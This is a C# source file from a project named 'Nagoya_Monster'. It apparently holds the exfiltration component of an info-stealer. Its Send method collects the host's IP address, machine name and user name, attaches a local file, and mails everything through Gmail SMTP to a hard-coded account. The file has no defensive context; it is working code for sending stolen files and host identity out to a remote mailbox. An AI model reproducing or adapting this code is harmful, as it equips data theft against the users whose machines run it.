using System;
using System.Net;
using System.Net.Mail;

namespace Nagoya_Monster
{
    static class Mail
    {
        public static void Send(string Subject, string Path)
        {
            string str = string.Format("From: {0} -> {1} -> {2}", (Program.GetIpAdress() ?? Program.GetIpAdress1()), Environment.MachineName, Environment.UserName);
            MailMessage message = new MailMessage();
            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
            message.From = new MailAddress(Program.EmailUser);
            message.To.Add(Program.EmailUser);
            message.Subject = Subject;
            message.Body = str;
            Attachment attachment = new Attachment(Path);
            message.Attachments.Add(attachment);

            smtpClient.Port = 587;
            smtpClient.Credentials = new NetworkCredential(userName: Program.EmailUser, password: Program.EmailPass);
            smtpClient.EnableSsl = true;
            smtpClient.Send(message);
            smtpClient.Dispose();
            message.Dispose();
            attachment.Dispose();
        }
    }
}
